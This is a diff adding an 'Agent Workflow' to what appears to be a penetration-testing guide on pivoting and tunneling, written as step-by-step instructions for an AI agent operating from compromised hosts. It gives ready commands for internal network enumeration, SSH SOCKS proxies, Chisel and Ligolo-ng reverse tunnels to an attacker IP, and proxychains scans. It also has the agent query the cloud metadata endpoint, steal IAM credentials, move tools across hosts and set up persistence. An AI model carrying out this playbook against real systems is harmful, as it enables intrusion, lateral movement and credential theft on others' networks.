@@ -346,6 +346,114 @@ cloudflared tunnel --url http://localhost:8080
 
 ---
 
+## Agent Workflow
+> Step-by-step instructions for an AI agent to set up pivoting and tunneling through compromised hosts.
+
+### Phase 1: Network Assessment
+1. After gaining initial access to a host, enumerate network interfaces and routes:
+   ```
+   # Linux
+   ifconfig && ip route && cat /etc/resolv.conf && arp -a
+   # Windows
+   ipconfig /all && route print && arp -a
+   ```
+2. Identify reachable internal subnets:
+   ```
+   # Linux ping sweep
+   for i in {1..254}; do (ping -c 1 <INTERNAL_SUBNET>.$i | grep "bytes from" &); done
+   ```
+3. Determine available tools on the compromised host:
+   - SSH client available? --> SSH tunneling
+   - Can upload binaries? --> Chisel or Ligolo-ng
+   - Python available? --> socat relay or custom script
+   - Only web access? --> SSRF as pivot
+4. Assess egress rules: which outbound ports are allowed?
+
+### Phase 2: Tunnel Setup
+1. **SSH Dynamic SOCKS proxy** (if SSH access to pivot host):
+   ```
+   ssh -D 9050 <USER>@<PIVOT_HOST> -N -f
+   # Configure proxychains: socks5 127.0.0.1 9050
+   ```
+2. **Chisel reverse SOCKS** (if binary upload possible):
+   ```
+   # Attacker: ./chisel server -p 8080 --reverse
+   # Victim: ./chisel client <ATTACKER_IP>:8080 R:socks
+   ```
+3. **Ligolo-ng** (for TUN-based tunneling without SOCKS overhead):
+   ```
+   # Attacker: sudo ./proxy -selfcert
+   # Victim: ./agent -connect <ATTACKER_IP>:11601 -v -accept-fingerprint <FP>
+   ```
+4. **sshuttle** (transparent routing without proxychains):
+   ```
+   sshuttle -r <USER>@<PIVOT_HOST> <INTERNAL_SUBNET>/24
+   ```
+5. **Port forward** (for specific service access):
+   ```
+   ssh -L <LOCAL_PORT>:<INTERNAL_TARGET>:<TARGET_PORT> <USER>@<PIVOT_HOST> -N -f
+   ```
+
+### Phase 3: Internal Reconnaissance
+1. Configure proxychains with the established tunnel
+2. Scan internal hosts through the tunnel:
+   ```
+   proxychains nmap -sT -Pn -p 22,80,443,445,3389 <INTERNAL_SUBNET>/24
+   ```
+3. Probe discovered internal web services:
+   ```
+   proxychains curl http://<INTERNAL_HOST>
+   ```
+4. Check for cloud metadata endpoints from the pivot host:
+   ```
+   curl http://169.254.169.254/latest/meta-data/
+   ```
+
+### Phase 4: Next Steps
+- Feed discovered internal hosts to service-specific enumeration
+- If cloud metadata accessible: steal IAM/managed identity credentials -- see [AWS](../../web/exploitation/cloud/aws.md), [Azure](../../web/exploitation/cloud/azure.md), [GCP](../../web/exploitation/cloud/gpc.md)
+- Set up additional pivots for multi-hop access (double pivoting)
+- Transfer exploitation tools to the pivot host for further attacks
+- Establish persistence on the pivot host if authorized
+
+## Decision Tree
+
+```
+START: Initial access to a host with internal network connectivity
+  |
+  +--> Enumerate network interfaces and reachable subnets
+  |
+  +--> Select tunneling method:
+  |      |
+  |      +--> SSH available? --> Dynamic SOCKS (-D) or local forward (-L)
+  |      +--> Binary upload possible?
+  |      |      |
+  |      |      +--> Full subnet access needed? --> Ligolo-ng (TUN interface)
+  |      |      +--> Simple SOCKS proxy sufficient? --> Chisel reverse SOCKS
+  |      |
+  |      +--> Only web access? --> SSRF as network pivot
+  |      +--> DNS only egress? --> dnscat2 DNS tunnel
+  |
+  +--> Configure proxychains with tunnel endpoint
+  |
+  +--> Internal recon: port scan, service discovery, metadata check
+  |
+  +--> Multi-hop needed?
+         |
+         +--> Yes --> Chain another tunnel through discovered host
+         +--> No --> Proceed with internal exploitation
+```
+
+## Success Criteria
+
+- [ ] Network interfaces and routing tables enumerated on pivot host
+- [ ] Internal subnets identified via ping sweep or ARP table
+- [ ] Tunnel established (SSH/Chisel/Ligolo-ng/sshuttle)
+- [ ] Proxychains configured and verified
+- [ ] Internal port scan completed through tunnel
+- [ ] Cloud metadata endpoint checked from pivot host
+- [ ] Discovered internal services documented for further testing
+
 ## References
 
 - [HackTricks -- Tunneling and Port Forwarding](https://book.hacktricks.wiki/generic-hacking/tunneling-and-port-forwarding.html)
